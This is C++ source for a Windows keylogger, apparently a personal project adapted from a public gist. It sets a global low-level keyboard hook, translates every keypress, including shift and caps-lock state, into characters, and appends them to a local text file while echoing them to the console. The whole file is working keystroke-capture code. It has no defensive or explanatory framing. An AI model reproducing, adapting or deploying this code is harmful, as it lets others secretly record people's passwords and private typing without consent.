// Keyzafinal.cpp : This file contains the 'main' function. Program execution begins and ends there.
// lot of code from: https://gist.github.com/sbarratt/3077d5f51288b39665350dc2b9e19694



#include "pch.h"
#include <iostream>
#include <fstream>
#include <windows.h>
#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

/*
	What we want to do:
	1) Set Hook via  SetWindowsHookExA
	2) Map key messages to chars
	3) Write out to a file

*/

HHOOK Hook;
KBDLLHOOKSTRUCT kbdStruct;

std::ofstream file;


enum Keys
{
	ShiftKey = 16,
	Capital = 20,
};

int shift_active() {
	return GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0;
}

int capital_active() {
	return (GetKeyState(VK_CAPITAL) & 1) == 1;
}


LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
	
	
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			if (kbdStruct.vkCode == 8) {
				file << "[BACK]" << std::flush;
				return CallNextHookEx(Hook, nCode, wParam, lParam);
			} else if(kbdStruct.vkCode == 13) {
				file << "[ENTER]" <<std::flush;
				return CallNextHookEx(Hook, nCode, wParam, lParam);
			}
			// ignore shift left/right and capslock, if one of these keys is pressed
			// this will taken care of with GetKeyboardState and shift/captial_active()
			// TODO: Reorder the checks
			else if (kbdStruct.vkCode == 160 || kbdStruct.vkCode == 161 || kbdStruct.vkCode == 20) {
				//file << "[ENTER]" << std::flush;
				return CallNextHookEx(Hook, nCode, wParam, lParam);
			}


			BYTE lpKeyState[256];
			GetKeyboardState(lpKeyState);
			lpKeyState[Keys::ShiftKey] = 0;
			lpKeyState[Keys::Capital] = 0;
			if (shift_active()) {
				lpKeyState[Keys::ShiftKey] = 0x80;
			}
			if (capital_active()) {
				lpKeyState[Keys::Capital] = 0x01;
			}
			char result;
			ToAscii(kbdStruct.vkCode, kbdStruct.scanCode, lpKeyState, (LPWORD)&result, 0);
			std::cout << result << std::endl;

			printf("Code %d ( result XORd with 0x8a: %d\n", kbdStruct.vkCode, result ^ 0x8a);
			file << result << std::flush;
		}
	}


	return CallNextHookEx(Hook, nCode, wParam, lParam);
}


int SetHook() {

	Hook = SetWindowsHookExA(WH_KEYBOARD_LL, HookCallback, NULL, 0);
	if (Hook == NULL) {
		MessageBox(NULL, L"Failed to set the hook!", L"FAIL!", MB_ICONINFORMATION);

	}

	return 0;
}




int main()
{

	file.open("hellomello.txt");
	file << "Start loggingxz..." << std::endl;

	SetHook();


	// loop for testing, benefit very low mem/cpu consumption, Sleep(x) is going crazy, then you can just use GetAsyncKeyState ;P
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{

	}

	UnhookWindowsHookEx(Hook);
	file.close();

	return 0;
}
